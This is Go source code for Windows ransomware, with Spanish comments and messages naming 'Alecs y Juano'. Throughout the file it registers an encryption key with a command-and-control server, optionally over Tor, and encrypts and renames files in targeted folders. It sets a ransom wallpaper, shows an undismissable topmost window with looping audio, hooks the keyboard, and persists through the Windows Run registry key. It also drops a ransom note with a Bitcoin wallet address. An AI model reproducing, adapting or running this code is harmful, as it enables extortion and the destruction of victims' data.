// +build windows
// +build go1.8

package main

import (
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/ElAlecs69/ransomware/client"
	"github.com/ElAlecs69/ransomware/cmd"
	"github.com/ElAlecs69/ransomware/cryptofs"
	"github.com/ElAlecs69/ransomware/tor"
	"github.com/ElAlecs69/ransomware/utils"
)

// Recursos incrustados para el fondo de pantalla y el audio
//go:embed images.jpg
var imageData []byte

//go:embed Theme.mp3
var audioData []byte

const (
	spiSetDeskWallpaper = 0x0014
	spifUpdateIniFile   = 0x01
	spifSendChange      = 0x02

	WS_CAPTION     = 0x00C00000
	WS_VISIBLE     = 0x10000000
	WS_EX_TOPMOST  = 0x00000008
	SW_SHOW        = 5
	WM_DESTROY     = 0x0002
	WM_CLOSE       = 0x0010
	WM_PAINT       = 0x000F
	WM_SYSCOMMAND  = 0x0112
	DT_CENTER      = 0x00000001
	DT_VCENTER     = 0x00000004
	DT_SINGLELINE  = 0x00000020
	TRANSPARENT    = 1
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	VK_CONTROL     = 0x11
	VK_SHIFT       = 0x10
	VK_3           = 0x33
	VK_M           = 0x4D
	VK_ENYE        = 0xBA

	HKEY_CURRENT_USER = 0x80000001
	KEY_SET_VALUE     = 0x0002
	REG_SZ            = 1

	SND_ASYNC     = 0x0001
	SND_NODEFAULT = 0x0002
	SND_MEMORY    = 0x0004
	SND_LOOP      = 0x0008
	SND_PURGE     = 0x0040
)

type WNDCLASSEX struct {
	cbSize        uint32
	style         uint32
	lpfnWndProc   uintptr
	cbClsExtra    int32
	cbWndExtra    int32
	hInstance     syscall.Handle
	hIcon         syscall.Handle
	hCursor       syscall.Handle
	hbrBackground syscall.Handle
	lpszMenuName  *uint16
	lpszClassName *uint16
	hIconSm       syscall.Handle
}

type MSG struct {
	Hwnd    syscall.Handle
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      struct{ X, Y int32 }
}

type RECT struct {
	Left, Top, Right, Bottom int32
}

type PAINTSTRUCT struct {
	Hdc         syscall.Handle
	FErase      int32
	RcPaint     RECT
	FRestore    int32
	FIncUpdate  int32
	RgbReserved [32]byte
}

var (
	UseTor           string
	SecondsToTimeout = 5.0
	ServerBaseURL    string
	Client           *client.Client

	FilesToRename struct {
		Files []*cryptofs.File
		sync.Mutex
	}

	user32   = syscall.NewLazyDLL("user32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	gdi32    = syscall.NewLazyDLL("gdi32.dll")
	advapi32 = syscall.NewLazyDLL("advapi32.dll")
	winmm    = syscall.NewLazyDLL("winmm.dll")
	procCreateSolidBrush = gdi32.NewProc("CreateSolidBrush")
procFillRect         = user32.NewProc("FillRect")

	procPlaySound = winmm.NewProc("PlaySoundW")

	procRegisterClassEx   = user32.NewProc("RegisterClassExW")
	procCreateWindowEx    = user32.NewProc("CreateWindowExW")
	procDefWindowProc     = user32.NewProc("DefWindowProcW")
	procShowWindow        = user32.NewProc("ShowWindow")
	procUpdateWindow      = user32.NewProc("UpdateWindow")
	procGetMessage        = user32.NewProc("GetMessageW")
	procTranslateMessage  = user32.NewProc("TranslateMessage")
	procDispatchMessage   = user32.NewProc("DispatchMessageW")
	procPostQuitMessage   = user32.NewProc("PostQuitMessage")
	procDestroyWindow     = user32.NewProc("DestroyWindow")
	procLoadCursor        = user32.NewProc("LoadCursorW")
	procBeginPaint        = user32.NewProc("BeginPaint")
	procEndPaint          = user32.NewProc("EndPaint")
	procDrawText          = user32.NewProc("DrawTextW")
	procGetClientRect     = user32.NewProc("GetClientRect")
	procSetWindowsHookEx  = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx    = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHook = user32.NewProc("UnhookWindowsHookEx")
	procGetAsyncKeyState  = user32.NewProc("GetAsyncKeyState")
	procGetSystemMetrics  = user32.NewProc("GetSystemMetrics")
	procGetModuleHandle   = kernel32.NewProc("GetModuleHandleW")

	procCreateFont   = gdi32.NewProc("CreateFontW")
	procSelectObject = gdi32.NewProc("SelectObject")
	procDeleteObject = gdi32.NewProc("DeleteObject")
	procSetBkMode    = gdi32.NewProc("SetBkMode")
	procSetTextColor = gdi32.NewProc("SetTextColor")

	procRegCreateKeyEx = advapi32.NewProc("RegCreateKeyExW")
	procRegSetValueEx  = advapi32.NewProc("RegSetValueExW")
	procRegCloseKey    = advapi32.NewProc("RegCloseKey")

	allowClose        = false
	hookHandle        uintptr
	muted             = false
	closeComboLatched = false
	muteComboLatched  = false
)

func init() {
	cmd.PrintBanner()
	cmd.CheckOS()
}

func main() {
	pubkey, err := Asset("public.pem")
	if err != nil {
		cmd.Logger.Println(err)
		return
	}

	Client = client.New(ServerBaseURL, pubkey)

	if UseTor == "true" {
		cmd.Logger.Println("Tor transport enabled")
		err = Client.UseTorTransport()
		if err != nil {
			cmd.Logger.Println(err)
			return
		}

		cmd.Logger.Println("Downloading the proxy")
		torProxy := tor.New(cmd.TempDir)
		torProxy.DownloadAndExtract()

		cmd.Logger.Println("Waiting tor bootstrap to complete")
		torProxy.Start()
		cmd.Logger.Println("Tor is now live")

		defer func() {
			log.Println("Shutting down Tor and running cleanup")
			torProxy.Kill()
			torProxy.Clean()
		}()
	}

	// 1. Modificar el fondo de pantalla automáticamente[cite: 9]
	cmd.Logger.Println("Cambiando fondo de pantalla...")
	changeWallpaper()

	// 2. Desplegar la ventana de notificación y audio en segundo plano[cite: 10]
	cmd.Logger.Println("Iniciando ventana y audio de rescate...")
	go runAbrazoWindow()

	// 3. Proceder con el cifrado de archivos (Hannibal ad portas)[cite: 2]
	encryptFiles()

	var s string
	fmt.Println("Press enter to quit")
	fmt.Scanf("%s", &s)
}

// ----------------- MÓDULO CAMBIO DE PANTALLA -----------------
func changeWallpaper() {
	tmpFile, err := os.CreateTemp("", "wallpaper_*.jpg")
	if err != nil {
		return
	}
	defer os.Remove(tmpFile.Name())

	if _, err := tmpFile.Write(imageData); err != nil {
		return
	}
	tmpFile.Close()

	pathPtr, err := syscall.UTF16PtrFromString(tmpFile.Name())
	if err != nil {
		return
	}

	systemParametersInfo := user32.NewProc("SystemParametersInfoW")
	systemParametersInfo.Call(
		uintptr(spiSetDeskWallpaper),
		0,
		uintptr(unsafe.Pointer(pathPtr)),
		uintptr(spifUpdateIniFile|spifSendChange),
	)
}

// ----------------- MÓDULO VENTANA Y AUDIO ("ABRAZO") -----------------
func playLoop() {
	if len(audioData) == 0 {
		return
	}
	procPlaySound.Call(
		uintptr(unsafe.Pointer(&audioData[0])),
		0,
		uintptr(SND_ASYNC|SND_MEMORY|SND_LOOP|SND_NODEFAULT),
	)
}

func stopAudio() {
	procPlaySound.Call(0, 0, uintptr(SND_PURGE))
}

func toggleMute() {
	if muted {
		muted = false
		playLoop()
	} else {
		muted = true
		stopAudio()
	}
}

func runAbrazoWindow() {
	if len(os.Args) > 1 && os.Args[1] == "-debug" {
		runDebugMode()
		return
	}

	registerAutostart()

	className, _ := syscall.UTF16PtrFromString("VentanaAbrazoClass")
	title, _ := syscall.UTF16PtrFromString("")

	hInstance, _, _ := procGetModuleHandle.Call(0)

	var wc WNDCLASSEX
	wc.cbSize = uint32(unsafe.Sizeof(wc))
	wc.lpfnWndProc = syscall.NewCallback(wndProc)
	wc.hInstance = syscall.Handle(hInstance)
	wc.lpszClassName = className
	cursor, _, _ := procLoadCursor.Call(0, 32512)
	wc.hCursor = syscall.Handle(cursor)
	wc.hbrBackground = syscall.Handle(16)

	procRegisterClassEx.Call(uintptr(unsafe.Pointer(&wc)))

	screenW, _, _ := procGetSystemMetrics.Call(0)
	screenH, _, _ := procGetSystemMetrics.Call(1)

	width, height := 520, 220
	x := (int(screenW) - width) / 2
	y := (int(screenH) - height) / 2

	hwnd, _, _ := procCreateWindowEx.Call(
		uintptr(WS_EX_TOPMOST),
		uintptr(unsafe.Pointer(className)),
		uintptr(unsafe.Pointer(title)),
		uintptr(WS_CAPTION|WS_VISIBLE),
		uintptr(x), uintptr(y),
		uintptr(width), uintptr(height),
		0, 0, hInstance, 0,
	)

	procShowWindow.Call(hwnd, SW_SHOW)
	procUpdateWindow.Call(hwnd)

	playLoop()

	hookHandle, _, _ = procSetWindowsHookEx.Call(
		uintptr(WH_KEYBOARD_LL),
		syscall.NewCallback(keyboardHookProc),
		hInstance,
		0,
	)

	var msg MSG
	for {
		ret, _, _ := procGetMessage.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if ret == 0 {
			break
		}
		procTranslateMessage.Call(uintptr(unsafe.Pointer(&msg)))
		procDispatchMessage.Call(uintptr(unsafe.Pointer(&msg)))
	}

	procUnhookWindowsHook.Call(hookHandle)
}

func wndProc(hwnd syscall.Handle, msg uint32, wParam, lParam uintptr) uintptr {
	switch msg {
	case WM_CLOSE:
		if allowClose {
			procDestroyWindow.Call(uintptr(hwnd))
		}
		return 0
	case WM_SYSCOMMAND:
		if (wParam & 0xFFF0) == 0xF060 {
			return 0
		}
		r, _, _ := procDefWindowProc.Call(uintptr(hwnd), uintptr(msg), wParam, lParam)
		return r
	case WM_DESTROY:
		procPostQuitMessage.Call(0)
		return 0
	case WM_PAINT:
		paint(hwnd)
		return 0
	}
	r, _, _ := procDefWindowProc.Call(uintptr(hwnd), uintptr(msg), wParam, lParam)
	return r
}

func paint(hwnd syscall.Handle) {
    var ps PAINTSTRUCT
    hdc, _, _ := procBeginPaint.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&ps)))

    var rect RECT
    procGetClientRect.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&rect)))

    // Pintar el fondo de la ventana completamente de NEGRO
    blackBrush, _, _ := procCreateSolidBrush.Call(0x000000)
    procFillRect.Call(hdc, uintptr(unsafe.Pointer(&rect)), blackBrush)
    gdi32.NewProc("DeleteObject").Call(blackBrush)

    procSetBkMode.Call(hdc, TRANSPARENT)

    // COLOR ROJO SANGRE (Formato BGR: 0x000000EE -> Rojo intenso)
    procSetTextColor.Call(hdc, 0x000000EE)

    // Fuente tétrica / grande para el título
    titleFont, _, _ := procCreateFont.Call(
        uintptr(26), 0, 0, 0, uintptr(800), 0, 0, 0,
        1, 0, 0, 0, 0,
        uintptr(unsafe.Pointer(strPtr("Impact"))), // Usar Impact o Consolas para un look más agresivo
    )
    oldFont, _, _ := procSelectObject.Call(hdc, titleFont)

    titleRect := RECT{rect.Left + 10, rect.Top + 20, rect.Right - 10, rect.Top + 90}
    titleText, _ := syscall.UTF16PtrFromString("¡TUS ARCHIVOS HAN SIDO SECUESTRADOS POR ALECS Y JUANO!")
    procDrawText.Call(
        hdc, uintptr(unsafe.Pointer(titleText)), ^uintptr(0),
        uintptr(unsafe.Pointer(&titleRect)),
        uintptr(DT_CENTER|DT_VCENTER|DT_SINGLELINE),
    )

    procSelectObject.Call(hdc, oldFont)
    procDeleteObject.Call(titleFont)

    // Fuente para el mensaje de rescate
    subFont, _, _ := procCreateFont.Call(
        uintptr(15), 0, 0, 0, uintptr(400), 0, 0, 0,
        1, 0, 0, 0, 0,
        uintptr(unsafe.Pointer(strPtr("Consolas"))),
    )
    oldFont2, _, _ := procSelectObject.Call(hdc, subFont)

    subRect := RECT{rect.Left + 10, rect.Top + 90, rect.Right - 10, rect.Bottom - 10}
    subText, _ := syscall.UTF16PtrFromString("No hay salida. Paga el rescate o pierdelo todo para siempre.")
    procDrawText.Call(
        hdc, uintptr(unsafe.Pointer(subText)), ^uintptr(0),
        uintptr(unsafe.Pointer(&subRect)),
        uintptr(DT_CENTER|DT_VCENTER|DT_SINGLELINE),
    )

    procSelectObject.Call(hdc, oldFont2)
    procDeleteObject.Call(subFont)

    procEndPaint.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&ps)))
}

func strPtr(s string) *uint16 {
	p, _ := syscall.UTF16PtrFromString(s)
	return p
}

func keyboardHookProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
	if nCode >= 0 && wParam == WM_KEYDOWN {
		ctrlDown := isKeyDown(VK_CONTROL)
		shiftDown := isKeyDown(VK_SHIFT)
		enyeDown := isKeyDown(VK_ENYE)
		threeDown := isKeyDown(VK_3)
		mDown := isKeyDown(VK_M)

		closeCombo := ctrlDown && shiftDown && enyeDown && threeDown
		muteCombo := ctrlDown && shiftDown && mDown && !enyeDown && !threeDown

		if closeCombo && !closeComboLatched {
			closeComboLatched = true
			allowClose = true
			stopAudio()
			procPostQuitMessage.Call(0)
		}
		if !closeCombo {
			closeComboLatched = false
		}

		if muteCombo && !muteComboLatched {
			muteComboLatched = true
			toggleMute()
		}
		if !muteCombo {
			muteComboLatched = false
		}
	}
	r, _, _ := procCallNextHookEx.Call(hookHandle, uintptr(nCode), wParam, lParam)
	return r
}

func isKeyDown(vk int) bool {
	state, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
	return state&0x8000 != 0
}

func registerAutostart() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	subKey, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)
	var hKey syscall.Handle
	ret, _, _ := procRegCreateKeyEx.Call(
		uintptr(HKEY_CURRENT_USER),
		uintptr(unsafe.Pointer(subKey)),
		0, 0, 0,
		uintptr(KEY_SET_VALUE),
		0,
		uintptr(unsafe.Pointer(&hKey)),
		0,
	)
	if ret != 0 {
		return
	}
	defer procRegCloseKey.Call(uintptr(hKey))

	valueName, _ := syscall.UTF16PtrFromString("VentanaAbrazo")
	pathUTF16, _ := syscall.UTF16PtrFromString(exePath)
	pathBytes := (*[1 << 20]byte)(unsafe.Pointer(pathUTF16))[: (len(exePath)+1)*2 : (len(exePath)+1)*2]

	procRegSetValueEx.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(valueName)),
		0,
		uintptr(REG_SZ),
		uintptr(unsafe.Pointer(&pathBytes[0])),
		uintptr(len(pathBytes)),
	)
}

func runDebugMode() {
	fmt.Println("Modo debug: pulsa teclas para ver su VK code")
	seen := map[int]bool{}
	for {
		for vk := 0x08; vk <= 0xFE; vk++ {
			down := isKeyDown(vk)
			if down && !seen[vk] {
				fmt.Printf("VK presionada: 0x%X\n", vk)
			}
			seen[vk] = down
		}
	}
}

// ----------------- MÓDULO CIFRADO (HANNIBAL AD PORTAS) -----------------
func encryptFiles() {
	keys := make(map[string]string)
	start := time.Now()
	for {
		if duration := time.Since(start); duration.Seconds() >= SecondsToTimeout {
			cmd.Logger.Println("Timeout reached. Aborting...")
			return
		}

		keys["id"], _ = utils.GenerateRandomANString(32)
		keys["enckey"], _ = utils.GenerateRandomANString(32)

		res, err := Client.AddNewKeyPair(keys["id"], keys["enckey"])
		if err != nil {
			cmd.Logger.Println("Ops, something went terribly wrong when contacting the C&C... Aborting...")
			cmd.Logger.Println(err)
			return
		}

		switch res.StatusCode {
		case 200, 204:
			break
		default:
			response := struct {
				Status  int    `json:"status"`
				Message string `json:"message"`
			}{}
			if err = json.NewDecoder(res.Body).Decode(&response); err != nil {
				cmd.Logger.Println(err)
				continue
			}
			cmd.Logger.Printf("%d - %s\n", response.Status, response.Message)
			continue
		}
		break
	}

	cmd.Logger.Println("Walking interesting dirs and indexing files...")

	cmd.Indexer.Add(1)

	go func() {
		defer cmd.Indexer.Done()

		for _, folder := range cmd.InterestingDirs {
			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
				cmd.Logger.Println("Walking " + path)

				if f.IsDir() && utils.SliceContainsSubstring(filepath.Base(path), cmd.SkippedDirs) {
					cmd.Logger.Printf("Skipping dir %s", path)
					return filepath.SkipDir
				}

				ext := strings.ToLower(filepath.Ext(path))

				if !f.IsDir() && f.Size() <= cmd.MaxFileSize && len(ext) >= 2 {
					if utils.StringInSlice(ext[1:], cmd.InterestingExtensions) {
						cmd.Logger.Println("Matched:", path)
						cmd.Indexer.Files <- &cryptofs.File{FileInfo: f, Extension: ext[1:], Path: path}
						cmd.Indexer.Add(1)
					}
				}
				return nil
			})
		}
		close(cmd.Indexer.Files)
	}()

	for i := 0; i < cmd.NumWorkers; i++ {
		go func() {
			for {
				select {
				case file, ok := <-cmd.Indexer.Files:
					if !ok {
						return
					}
					defer cmd.Indexer.Done()

					cmd.Logger.Printf("Encrypting %s...\n", file.Path)

					tempFile, err := os.OpenFile(cmd.TempDir+file.Name(), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
					if err != nil {
						cmd.Logger.Println(err)
						return
					}
					defer tempFile.Close()

					err = file.Encrypt(keys["enckey"], tempFile)
					if err != nil {
						cmd.Logger.Println(err)
						continue
					}

					tempFile.Close()

					err = file.ReplaceBy(cmd.TempDir + file.Name())
					if err != nil {
						cmd.Logger.Println(err)
						continue
					}

					FilesToRename.Lock()
					FilesToRename.Files = append(FilesToRename.Files, file)
					FilesToRename.Unlock()
				}
			}
		}()
	}

	cmd.Indexer.Wait()

	var listFilesEncrypted []string

	cmd.Logger.Println("Renaming files...")
	for _, file := range FilesToRename.Files {
		newpath := strings.Replace(file.Path, file.Name(), base64.StdEncoding.EncodeToString([]byte(file.Name())), -1)

		cmd.Logger.Printf("Renaming %s to %s\n", file.Path, newpath)
		err := utils.RenameFile(file.Path, newpath+cmd.EncryptionExtension)
		if err != nil {
			cmd.Logger.Println(err)
			continue
		}

		listFilesEncrypted = append(listFilesEncrypted, file.Path)
	}

	message := `
	<pre>
	Has sido encriptado por Alecs y Juano
	usando el algoritmo AES-256.

	Tu identificador unico es:
	%s

	Manda %s a mi wallet
	13i4TFvHBr9Ls24hGvN2BLKVe3Kj3gnzU1

	Despues de que pagues %s
	Manda tu identificador unico para darte%s
	La llave que desencripta tus archivos.
	</pre>
	`
	content := []byte(fmt.Sprintf(message, keys["id"], cmd.Price, cmd.Wallet, cmd.ContactEmail))

	ioutil.WriteFile(cmd.UserDir+"Desktop\\Leeme_para_desencriptar.html", content, 0600)
	ioutil.WriteFile(cmd.UserDir+"Desktop\\Archivos_Encriptados.html", []byte(strings.Join(listFilesEncrypted, "<br>")), 0600)

	cmd.Logger.Println("Ya quedó! No olvides leer Leeme_para_desencriptar.html en tu escritorio.")
}